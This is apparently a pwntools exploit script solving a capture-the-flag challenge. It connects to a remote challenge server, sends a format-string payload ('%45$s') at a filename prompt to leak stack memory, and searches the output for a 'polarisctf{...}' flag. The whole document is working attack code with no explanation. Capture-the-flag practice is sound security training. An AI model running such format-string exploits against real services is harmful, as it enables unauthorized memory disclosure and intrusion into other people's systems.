from pwn import *
import re
io=remote("nc1.ctfplus.cn", 12580)
io.recvuntil(b"Enter the filename to download: ")
io.sendline(b"%45$s")
data = io.recvuntil(b"Enter the filename to download: ")
io.close()
m = re.search(rb"polarisctf\{[^}]+\}", data)
if m:
    print(m.group(0).decode())
else:
    print("flag not found")
